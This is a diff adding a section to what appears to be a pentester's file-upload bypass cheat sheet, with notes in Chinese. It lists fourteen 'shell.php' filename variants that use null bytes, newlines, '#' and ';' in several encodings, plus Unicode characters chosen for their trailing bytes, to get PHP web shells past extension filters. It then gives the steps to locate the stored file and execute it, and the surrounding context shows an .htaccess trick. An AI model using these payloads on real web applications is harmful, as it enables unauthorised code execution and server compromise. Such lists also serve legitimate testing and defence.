@@ -22,6 +22,25 @@ shell.php%20  shell.php.         (trailing space/dot - Windows trims)
 .jsp .jspx .jsw .jsv .war (Java)   .asp .aspx .asa .cer .asmx (IIS)
 ```
 
+## Extension bypass V2 — 多编码族变体 14 条（2026-10 @Zerodaylabowner）
+
+同一批截断/注释字符按各层（WAF / 框架 / 落盘 / 存储）的解析差逐个换编码形态：
+
+```
+# null 字节
+shell.php%00.jpg
+# LF 换行
+shell.php%0A.jpg       shell.php\n.jpg        shell.php\u000a.jpg
+shell.php嘊.jpg        shell.php%E5%98%8A.jpg      (= U+560A / \u560a)
+# '#' 片段
+shell.php#.jpg         shell.php%23.jpg       shell.php\u0023.jpg
+# ';' 参数分隔
+shell.php;.jpg         shell.php%3B.jpg       shell.php\u003b.jpg
+shell.php嘻.jpg        shell.php%E5%98%BB.jpg      (= U+563B / \u563b)
+```
+
+判定：上传后查落盘名（下载链接 / 回显 / 路径），再直连试执行；同族逐条换。
+
 ## Config-file uploads (turn a benign upload into exec)
 ```apache
 # .htaccess (Apache) - then upload a .gif containing PHP
